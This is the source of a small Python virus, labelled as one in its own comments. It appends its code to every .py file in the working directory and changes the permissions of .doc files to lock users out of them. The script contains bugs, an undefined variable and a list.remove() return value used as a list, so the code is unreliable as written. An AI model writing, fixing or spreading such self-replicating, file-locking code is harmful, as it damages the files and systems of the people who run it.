# importing impirtant libarys to create our new python computer virus

import glob
import os

# finding files which we want to infect

def files_to_infect():
    files_list = glob.glob('*.py')
    return file_list.remove(__file__)

# getting virus code to cpoy itself to another python files

def get_virus_code():
    file = open(__file__,'r')
    virus = file.read()
    return virus

# copying virus by help of over writing the virus code

def copy_virus(content):
 for files in files_to_infect():
    file = open(files,'a')
    file.write(content)
    file.close()  

# calling the functions  to copy the virus and overwriting the content of virus code

def infect():
    copy_virus(get_virus_code())

# corrupting ms document files

def lock_files():
 files_to_lock = glob.glob('*.doc')
 
 for doc_files in files_to_lock:
  os.chmod(doc_files,100)
  
# finally calling the important functions of virus

def final_virus():
 infect()
 lock_files()

# calling the function called final virus which will be our new python computer virus

final_virus()

# don't try this at home "A HARMFULL RISK FOR COMPUTER CAN BE HAPPEN"
